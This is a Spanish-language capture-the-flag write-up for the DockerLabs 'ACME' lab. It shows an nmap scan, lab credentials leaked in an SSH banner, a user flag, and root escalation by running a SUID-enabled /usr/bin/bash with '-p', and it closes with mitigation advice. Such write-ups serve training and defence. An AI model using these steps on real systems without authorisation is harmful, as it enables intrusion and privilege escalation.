---
layout: writeups
title: "ACME"
platform: dockerlabs
difficulty: muy-facil
date: 2026-10-12
permalink: /writeups/dockerlabs/acme/
ip: 172.17.0.2
os: Linux
tools: [nmap, ssh, suid]
source_url: https://dockerlabs.es/
description: "Máquina muy fácil de DockerLabs: una web corporativa en mantenimiento filtra en el banner de SSH unas credenciales temporales, y un binario bash con bit SUID mal configurado permite escalar directamente a root."
---

**ACME** es una máquina <span class="tag tag-green">muy fácil</span> centrada en dos fallos muy típicos en entornos reales: <span class="tag tag-yellow">fuga de credenciales</span> en un banner de bienvenida y una mala configuración de <span class="tag tag-red">SUID</span>. Nada de cadenas complicadas: todo el recorrido sale de leer con atención lo que el propio sistema nos enseña.

## Despliegue

<div class="terminal">
  <div class="terminal-bar">
    <div class="dot-r"></div><div class="dot-y"></div><div class="dot-g"></div>
    <span class="terminal-title">bash — kali@kali:~/acme</span>
  </div>
  <div class="terminal-body">
    <div class="t-cmd">sudo bash auto_deploy.sh acme.tar</div>
    <div class="t-out">Estamos desplegando la máquina vulnerable, espere un momento.</div>
    <div class="t-ok">Máquina desplegada, su dirección IP es → 172.17.0.2</div>
  </div>
</div>

A partir de aquí, toda la auditoría va contra `172.17.0.2`.

## Enumeración

### Escaneo de puertos

<div class="terminal">
  <div class="terminal-bar">
    <div class="dot-r"></div><div class="dot-y"></div><div class="dot-g"></div>
    <span class="terminal-title">bash — kali@kali:~</span>
  </div>
  <div class="terminal-body">
    <div class="t-cmd">sudo nmap -p- -sS -sV --min-rate 5000 -n -Pn --open 172.17.0.2</div>
    <div class="t-ok">22/tcp open ssh&nbsp;&nbsp;OpenSSH 8.9p1 Ubuntu 3ubuntu0.16 (Ubuntu Linux; protocol 2.0)</div>
    <div class="t-ok">80/tcp open http&nbsp;&nbsp;Apache httpd 2.4.52 ((Ubuntu))</div>
  </div>
</div>

Dos puertos abiertos: <span class="tag tag-blue">SSH</span> y un <span class="tag tag-blue">Apache</span> en el 80.

### Puerto 80 — portal web

`http://172.17.0.2` muestra el **ACME Infrastructure Portal**, en modo mantenimiento:

<div class="glass-card" style="margin:1.25rem 0;">
  <strong style="color:var(--text)">ℹ️ Aviso de acceso y administración</strong>
  <p style="margin-top:.5rem;color:var(--text2)">El acceso a las consolas de gestión se realiza exclusivamente mediante el servicio SSH. <strong style="color:var(--text)">Pruebe a conectarse por SSH con cualquier usuario</strong> para consultar el aviso y las notificaciones del sistema con las instrucciones de acceso.</p>
</div>

La propia web nos dice por dónde seguir. Vamos a comprobarlo.

## Explotación — acceso inicial

Nos conectamos por SSH con un usuario cualquiera, tal y como sugiere el portal. Antes de pedir contraseña, el servidor suelta un banner (MOTD) que **filtra credenciales temporales**:

<div class="terminal">
  <div class="terminal-bar">
    <div class="dot-r"></div><div class="dot-y"></div><div class="dot-g"></div>
    <span class="terminal-title">bash — kali@kali:~</span>
  </div>
  <div class="terminal-body">
    <div class="t-cmd">ssh usuario@172.17.0.2</div>
    <div class="t-out">[*] ACME Corporation - Nodo Bastión de Mantenimiento Interno</div>
    <div class="t-warn">[!] AVISO DE SEGURIDAD Y ACCESO:</div>
    <div class="t-out">[!] Portal corporativo en proceso de migración a infraestructura interna.</div>
    <div class="t-out">[!] Credenciales temporales asignadas para tareas de mantenimiento:</div>
    <div class="t-ok">[!]&nbsp;&nbsp;- Usuario: usuario</div>
    <div class="t-ok">[!]&nbsp;&nbsp;- Password: P@ssw0rd2026_CTF!</div>
  </div>
</div>

Con esas credenciales entramos sin problema.

### Flag de usuario

<div class="terminal">
  <div class="terminal-bar">
    <div class="dot-r"></div><div class="dot-y"></div><div class="dot-g"></div>
    <span class="terminal-title">bash — usuario@acme:~</span>
  </div>
  <div class="terminal-body">
    <div class="t-cmd">whoami</div>
    <div class="t-out">usuario</div>
    <div class="t-cmd">ls</div>
    <div class="t-out">user.txt</div>
    <div class="t-cmd">cat user.txt</div>
    <div class="t-ok">FLAG{nmap_recon_ssh_foothold_7a9f24e1}</div>
  </div>
</div>

## Escalada de privilegios

Primero, lo obvio: probar si la misma contraseña sirve para `root` (reutilización de credenciales).

<div class="terminal">
  <div class="terminal-bar">
    <div class="dot-r"></div><div class="dot-y"></div><div class="dot-g"></div>
    <span class="terminal-title">bash — usuario@acme:~</span>
  </div>
  <div class="terminal-body">
    <div class="t-cmd">su -</div>
    <div class="t-out">Password:</div>
    <div class="t-err">su: Authentication failure</div>
  </div>
</div>

No cuela. Tocaría enumerar en serio. Buscamos binarios con el bit <span class="tag tag-red">SUID</span> activo:

<div class="terminal">
  <div class="terminal-bar">
    <div class="dot-r"></div><div class="dot-y"></div><div class="dot-g"></div>
    <span class="terminal-title">bash — usuario@acme:~</span>
  </div>
  <div class="terminal-body">
    <div class="t-cmd">find / -perm -4000 -ls 2&gt;/dev/null</div>
    <div class="t-out">... chfn, dash, umount, su, passwd, gpasswd, newgrp, chsh, mount, sudo ...</div>
    <div class="t-err">-rwsr-xr-x 1 root root 1396520 ... /usr/bin/bash</div>
  </div>
</div>

Entre los SUID "normales" del sistema aparece uno que **no debería estar ahí**: `/usr/bin/bash` tiene el bit SUID activo. Al ejecutarlo con `-p` (conserva privilegios efectivos), obtenemos una shell con UID efectivo `root`:

<div class="terminal">
  <div class="terminal-bar">
    <div class="dot-r"></div><div class="dot-y"></div><div class="dot-g"></div>
    <span class="terminal-title">bash — usuario@acme:~</span>
  </div>
  <div class="terminal-body">
    <div class="t-cmd">/usr/bin/bash -p</div>
    <div class="t-cmd">whoami</div>
    <div class="t-ok">root</div>
  </div>
</div>

Confirmamos el compromiso total:

<div class="terminal">
  <div class="terminal-bar">
    <div class="dot-r"></div><div class="dot-y"></div><div class="dot-g"></div>
    <span class="terminal-title">bash — root@acme:~</span>
  </div>
  <div class="terminal-body">
    <div class="t-cmd">hostname -I; whoami; id</div>
    <div class="t-out">172.17.0.2</div>
    <div class="t-out">root</div>
    <div class="t-ok">uid=1000(usuario) gid=1000(usuario) euid=0(root) groups=1000(usuario)</div>
  </div>
</div>

`euid=0(root)` confirma que, aunque seguimos siendo el usuario 1000 a nivel real, el **UID efectivo es root**.

## Cadena de ataque — resumen

1. **Recon web** → el portal en mantenimiento sugiere login SSH con cualquier usuario.
2. **Fuga de información** → el banner de SSH expone usuario y contraseña temporales.
3. **Acceso inicial** → login SSH con esas credenciales → flag de usuario.
4. **Escalada** → `find / -perm -4000` revela `/usr/bin/bash` con SUID → `bash -p` → root.

## Mitigación

- No meter credenciales ni avisos internos en banners o MOTD de SSH (`/etc/motd`, `PrintMotd`, `Banner` en `sshd_config`).
- Auditar binarios SUID (`find / -perm -4000`) y quitar el bit a cualquiera que no lo necesite — **nunca** debería estar en `bash`, `sh`, `python`, etc.
- Mínimo privilegio + rotación real de credenciales temporales, no texto plano fijo.

## Flag

<div class="terminal">
  <div class="terminal-bar">
    <div class="dot-r"></div><div class="dot-y"></div><div class="dot-g"></div>
    <span class="terminal-title">flag</span>
  </div>
  <div class="terminal-body">
    <div class="t-ok">FLAG{nmap_recon_ssh_foothold_7a9f24e1}</div>
  </div>
</div>

## Certificado

<div class="glass-card" style="text-align:center; padding:1.5rem;">
  <img src="/assets/img/writeups/dockerlabs/acme-diploma.png" alt="Diploma de finalización del laboratorio ACME — DockerLabs" style="border:none; margin:0 0 1.1rem; border-radius:10px; max-width:100%;">
  <div class="wu-meta" style="justify-content:center;">
    <span class="wu-meta-item">📅 14/10/2026</span>
    <span class="wu-meta-item">🆔 DL-4896D4</span>
    <span class="wu-meta-item"><a href="https://dockerlabs.es" target="_blank" rel="noopener">dockerlabs.es</a></span>
  </div>
</div>
